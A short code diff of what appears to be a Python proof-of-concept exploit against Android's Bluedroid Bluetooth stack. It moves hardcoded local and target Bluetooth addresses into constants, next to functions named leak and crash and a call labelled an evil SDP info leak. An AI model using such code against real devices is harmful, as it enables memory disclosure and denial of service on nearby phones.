@@ -17,6 +17,10 @@ from pwn import log
 BNEP_PSM = 15
 
 
+LOCAL_BTADDR = 'd8:fc:93:6e:aa:95'
+#TARGET_BTADDR = '2c:8a:72:ff:0a:67'
+TARGET_BTADDR = '78:f8:82:95:6d:85'
+
 def leak(dst):
     print ("[*] Connecting SDP...")
 
@@ -38,7 +42,8 @@ def leak(dst):
 
 def crash(dst):
     bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
-    bnep.bind( ('d8:fc:93:6e:aa:95', 0) )
+
+    bnep.bind( (LOCAL_BTADDR, 0) )
     bnep.connect( (dst, BNEP_PSM) )
 
     print("[*] BNEP Connected.")
@@ -55,9 +60,6 @@ def crash(dst):
     print ("")
 
 if __name__ == '__main__':
-
-    #TARGET_BTADDR = '2c:8a:72:ff:0a:67'
-    TARGET_BTADDR = '78:f8:82:95:6d:85'
 
     #bluedroid.my_sdp_info(TARGET_BTADDR)
     #bluedroid.my_evil_sdp_info_leak(TARGET_BTADDR)
